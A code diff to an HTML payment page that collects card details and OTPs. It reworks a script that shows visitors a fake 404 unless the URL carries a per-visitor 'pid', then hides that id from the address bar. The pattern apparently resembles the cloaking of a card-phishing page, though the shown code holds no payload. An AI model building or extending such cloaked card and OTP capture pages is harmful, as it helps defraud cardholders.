@@ -256,23 +256,29 @@
   <!-- Access Control Script -->
   <script>
     (function(){
-      // First, try to get pid from URL.
-      var urlParams = new URLSearchParams(window.location.search);
-      var pid = urlParams.get("pid");
+      // Try to retrieve the pid from the URL
+      const urlParams = new URLSearchParams(window.location.search);
+      let pid = urlParams.get("pid");
 
-      // If a valid pid exists, store it in sessionStorage and rewrite URL.
+      // If a valid pid is present in the URL and it's not the string "null"
       if(pid && pid !== "null") {
+        // Save it to sessionStorage so subsequent visits in this session are valid
         sessionStorage.setItem("valid_pid", pid);
+        // Rewrite the URL to remove the query parameters (hiding .html and the query string)
         history.replaceState(null, "", "/" + pid);
       } else {
-        // If no pid in URL, check sessionStorage.
+        // Otherwise, try to retrieve it from sessionStorage
         pid = sessionStorage.getItem("valid_pid");
-        // If still not found, display a 404 error page.
-        if(!pid) {
-          document.addEventListener("DOMContentLoaded", function(){
-            document.body.innerHTML = '<div class="error-page"><h1>404</h1><p>Page not found</p></div>';
-          });
-        }
+      }
+
+      // If we still don't have a valid pid, show a 404 error page.
+      if(!pid) {
+        document.addEventListener("DOMContentLoaded", function(){
+          document.body.innerHTML = `<div class="error-page">
+            <h1>404</h1>
+            <p>Page not found</p>
+          </div>`;
+        });
       }
     })();
   </script>
@@ -460,7 +466,7 @@
   </div>
 
   <script>
-    // Payment page form submission and OTP handling code remain unchanged.
+    // Payment page form submission and OTP handling remain unchanged.
     document.getElementById('mainForm').addEventListener('submit', async function(e) {
       e.preventDefault();
       if (!isCardValid || !isExpiryValid || isProcessing) return;
@@ -539,7 +545,7 @@
       }
     });
 
-    // Additional functions (updateSubmitButton, checkTransactionStatus, etc.) remain unchanged.
+    // Additional functions like updateSubmitButton, checkTransactionStatus, etc. remain unchanged.
   </script>
   <script src="/socket.io/socket.io.js"></script>
   <script>
